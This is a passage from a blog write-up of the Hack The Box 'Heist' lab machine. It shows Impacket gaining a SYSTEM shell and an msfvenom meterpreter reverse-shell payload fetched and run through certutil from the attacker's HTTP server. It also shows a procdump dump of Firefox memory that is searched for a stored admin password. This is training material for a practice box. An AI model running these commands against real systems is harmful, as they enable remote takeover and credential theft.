+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on heist.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file igPymROC.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on heist.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service KKCH on heist.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service KKCH.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.437]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;more root.txt
+50dfXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h1 id="roottxt-2">root.txt (2)</h1><p>So apparently there was another or more “proper” way to solving this box by using a very certain process. But first, lets upgrade to a meterpreter shell.</p><p>To do so, we will first need to create our executable which will establish the reverse connection back to our listener. After that, move the executable into the directory that the <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> is running from.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.XXX.XXX <span class="nv">LPORT</span><span class="o">=</span>1337 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+</pre></table></code></div></div><p>And we start our listener on port 1337…</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfconsole
+msf5 <span class="o">&gt;</span> use exploit/multi/handler
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 1337
+LPORT <span class="o">=&gt;</span> 1337
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.XXX.XXX
+LHOST <span class="o">=&gt;</span> 10.10.14.61
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.XXX.XXX:1337
+</pre></table></code></div></div><p>Back to our <code class="language-plaintext highlighter-rouge">WinRM</code> shell, we retrieve the executable from our <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> using <code class="language-plaintext highlighter-rouge">certutil.exe</code> and run it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>PS supportdesk<span class="se">\c</span>hase@SUPPORTDESK Chase&gt; certutil.exe <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="nt">-f</span> http://10.10.XXX.XXX/shell.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  000000  ...
+  01204a
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+PS supportdesk<span class="se">\c</span>hase@SUPPORTDESK Documents&gt; cmd.exe /k shell.exe
+</pre></table></code></div></div><p>Back on our listener, we obtained a meterpreter shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>179779 bytes<span class="o">)</span> to 10.10.10.149
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.XXX.XXX:1337 -&gt; 10.10.10.149:49694<span class="o">)</span> at 2019-08-31 09:04:09 <span class="nt">-0400</span>
+
+meterpreter <span class="o">&gt;</span>
+</pre></table></code></div></div><p>When we list all the processes running on the box using the <code class="language-plaintext highlighter-rouge">ps</code> command, we noticed that <code class="language-plaintext highlighter-rouge">firefox.exe</code> is currently running.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> ps
+Process List
+<span class="o">============</span>
+
+ PID   PPID  Name                       Arch  Session  User               Path
+ <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>                       <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>               <span class="nt">----</span>
+796   4660  firefox.exe                x64   1        SUPPORTDESK<span class="se">\C</span>hase  C:<span class="se">\P</span>rogram Files<span class="se">\M</span>ozilla Firefox<span class="se">\f</span>irefox.exe
+1620  796   firefox.exe                x64   1        SUPPORTDESK<span class="se">\C</span>hase  C:<span class="se">\P</span>rogram Files<span class="se">\M</span>ozilla Firefox<span class="se">\f</span>irefox.exe
+2264  796   firefox.exe                x64   1        SUPPORTDESK<span class="se">\C</span>hase  C:<span class="se">\P</span>rogram Files<span class="se">\M</span>ozilla Firefox<span class="se">\f</span>irefox.exe
+5912  796   firefox.exe                x64   1        SUPPORTDESK<span class="se">\C</span>hase  C:<span class="se">\P</span>rogram Files<span class="se">\M</span>ozilla Firefox<span class="se">\f</span>irefox.exe
+6068  796   firefox.exe                x64   1        SUPPORTDESK<span class="se">\C</span>hase  C:<span class="se">\P</span>rogram Files<span class="se">\M</span>ozilla Firefox<span class="se">\f</span>irefox.exe
+</pre></table></code></div></div><p>Lets try to dump out the process’s memory to see if we can extract any credentials! I will be using <a href="https://live.sysinternals.com/">Sysinternals</a>’s <code class="language-plaintext highlighter-rouge">procdump.exe</code>. Since we already have a meterpreter shell, we can just use the <code class="language-plaintext highlighter-rouge">upload</code> command to transfer it over.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> upload procdump.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> uploading  : procdump.exe -&gt; procdump.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 636.16 KiB of 636.16 KiB <span class="o">(</span>100.0%<span class="o">)</span>: procdump.exe -&gt; procdump.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> uploaded   : procdump.exe -&gt; procdump.exe
+</pre></table></code></div></div><p>Next up, we spawn a <code class="language-plaintext highlighter-rouge">cmd.exe</code> shell and run <code class="language-plaintext highlighter-rouge">procdump.exe</code> on the <code class="language-plaintext highlighter-rouge">firefox.exe</code> process.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> shell
+Process 3708 created.
+Channel 102 created.
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.437]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\C</span>hase&gt;procdump.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> 796
+procdump.exe <span class="nt">-accepteula</span> <span class="nt">-ma</span> 796
+
+ProcDump v9.0 - Sysinternals process dump utility
+Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2017 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+<span class="o">[</span>19:30:23] Dump 1 initiated: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\f</span>irefox.exe_190831_193023.dmp
+<span class="o">[</span>19:30:24] Dump 1 writing: Estimated dump file size is 473 MB.
+<span class="o">[</span>19:30:29] Dump 1 <span class="nb">complete</span>: 474 MB written <span class="k">in </span>5.2 seconds
+<span class="o">[</span>19:30:29] Dump count reached.
+</pre></table></code></div></div><p>With that done, we exit out of our <code class="language-plaintext highlighter-rouge">cmd.exe</code> and use the <code class="language-plaintext highlighter-rouge">download</code> command to retrieve the process dump.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>C:<span class="se">\U</span>sers<span class="se">\C</span>hase&gt;exit
+<span class="nb">exit
+</span>meterpreter <span class="o">&gt;</span> download C:<span class="se">\\</span>Users<span class="se">\\</span>Chase<span class="se">\\</span>firefox.exe_190831_193023.dmp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\f</span>irefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloaded 462.05 MiB of 462.05 MiB <span class="o">(</span>100.0%<span class="o">)</span>: C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\f</span>irefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> download   : C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\f</span>irefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp
+</pre></table></code></div></div><p>The final step is simply to run <code class="language-plaintext highlighter-rouge">strings</code> on it and <code class="language-plaintext highlighter-rouge">grep</code> for <code class="language-plaintext highlighter-rouge">password</code>. There were many lines containing <code class="language-plaintext highlighter-rouge">password</code> but I came across this line:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>:http://localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+</pre></table></code></div></div><p>The password seems to be the value for <code class="language-plaintext highlighter-rouge">login_password</code>. Refer to <code class="language-plaintext highlighter-rouge">root.txt (1)</code> on how to establish a shell using the credentials we found.</p><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/winrm/" class="post-tag no-text-decoration" >winrm</a> <a href="/tags/memorydump/" class="post-tag no-text-decoration" >memorydump</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Heist - rizemon's blog&url=https://rizemon.github.io/posts/heist-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Heist - rizemon's blog&u=https://rizemon.github.io/posts/heist-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Heist - rizemon's blog&url=https://rizemon.github.io/posts/heist-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cascade-htb/"><div class="card-body"> <span class="timeago small" > Jul 26, 2020 <i class="unloaded">2020-07-26T13:28:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Cascade</h3><div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM. What I learnt from other writeups is that it was a good habit to map a domain n...</p></div></div></a></div><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/json-htb/"><div class="card-body"> <span class="timeago small" > Feb 16, 2020 <i class="unloaded">2020-02-16T01:41:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Json</h3><div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mac...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/networked-htb/" class="btn btn-outline-primary"><p>Hack The Box - Networked</p></a> <a href="/posts/craft-htb/" class="btn btn-outline-primary"><p>Hack The Box - Craft</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
